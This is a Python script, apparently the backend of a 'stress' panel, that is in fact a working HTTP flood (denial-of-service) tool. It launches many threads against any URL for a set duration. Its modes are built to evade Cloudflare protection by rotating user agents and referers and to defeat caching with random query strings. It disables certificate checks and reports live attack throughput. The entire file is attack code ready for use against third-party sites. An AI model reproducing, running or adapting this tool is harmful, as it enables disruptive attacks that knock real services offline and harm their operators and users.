import sys
import threading
import time
import random
import string
import urllib.request
import urllib.error
import socket

# Monster Stres Engine V2 (Cyberpunk Edition)
# Usage: python3 stress_engine.py <URL> <THREADS> <DURATION> <PORT> <MODE>

# Modes:
# 1: NORMAL (Standard Request)
# 2: BYPASS_CF (Cloudflare Evasion - UserAgents + Referers)
# 3: BYPASS_CACHE (Random Query Params)
# 4: KILL_ALL (Mixed)

print("[DEBUG] PYTHON ENGINE LOADED", flush=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36"
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/"
]

def get_random_string(length=8):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

# Shared Counter
TOTAL_REQUESTS = 0
TOTAL_BYTES_SENT = 0

def attack(target_url, end_time, thread_id, port, mode):
    global TOTAL_REQUESTS, TOTAL_BYTES_SENT
    
    # SSL Context
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    while time.time() < end_time:
        try:
            curr_url = target_url
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': '*/*'
            }

            # MODE LOGIC
            if mode == '2' or mode == '4': # BYPASS CF
                headers['Referer'] = random.choice(REFERERS)
                headers['Upgrade-Insecure-Requests'] = '1'
                headers['Cache-Control'] = 'max-age=0'

            if mode == '3' or mode == '4': # BYPASS CACHE
                separator = '&' if '?' in curr_url else '?'
                curr_url = f"{curr_url}{separator}t={get_random_string(5)}&r={random.randint(1,100000)}"

            # Construct Request
            req = urllib.request.Request(curr_url, headers=headers)
            
            # Fire!
            with urllib.request.urlopen(req, timeout=5, context=ctx) as response:
                # Read response to fully consume
                data = response.read(1024) 
                
                # ESTIMATE BANDWIDTH (Headers + Body Sent)
                # Roughly: URL Length + Header Length
                bytes_sent = len(curr_url) + sum(len(k)+len(v) for k,v in headers.items()) + 200 # +200 overhead
                
                TOTAL_BYTES_SENT += bytes_sent
                TOTAL_REQUESTS += 1
                
        except Exception:
            pass

def main():
    if len(sys.argv) < 6:
        print("Usage: python3 stress_engine.py <URL> <THREADS> <DURATION> <PORT> <MODE>")
        sys.exit(1)

    url = sys.argv[1]
    threads_count = int(sys.argv[2])
    duration = int(sys.argv[3])
    port = sys.argv[4]
    mode = sys.argv[5]

    # Ensure URL Scheme
    if not url.startswith('http'):
        url = 'http://' + url

    # Parse Host for display
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        host = parsed.netloc
    except:
        host = url

    print(f"[*] TARGET LOCKED: {host} (PORT: {port})")
    print(f"[*] MODE: {get_mode_name(mode)}")
    print(f"[*] THREADS: {threads_count} | DURATION: {duration}s")
    print(f"[*] DEPLOYING {threads_count} WARHEADS...")
    print("-" * 40)
    sys.stdout.flush()

    end_time = time.time() + duration
    threads = []

    for i in range(threads_count):
        t = threading.Thread(target=attack, args=(url, end_time, i, port, mode))
        t.daemon = True
        t.start()
        threads.append(t)

    # Live Monitor
    start_time = time.time()
    last_bytes_check = 0
    
    while time.time() < end_time:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        
        # Calculate Speed
        current_bytes = TOTAL_BYTES_SENT
        bytes_delta = current_bytes - last_bytes_check
        mbps = (bytes_delta * 8) / (1024 * 1024) # Bits / Meg
        last_bytes_check = current_bytes
        
        print(f"PROGRESS:{elapsed}:{duration} | SPEED: {mbps:.2f} Mbps") # Hook for PHP
        sys.stdout.flush()

    print("-" * 40)
    print("[*] MISSION COMPLETE. SYSTEM COOLING DOWN.")

def get_mode_name(mode):
    if mode == '1': return "STANDARD STORM"
    if mode == '2': return "CLOUDFLARE EVASION"
    if mode == '3': return "CACHE BUSTER"
    if mode == '4': return "TOTAL ANNIHILATION"
    return "UNKNOWN"

if __name__ == "__main__":
    main()
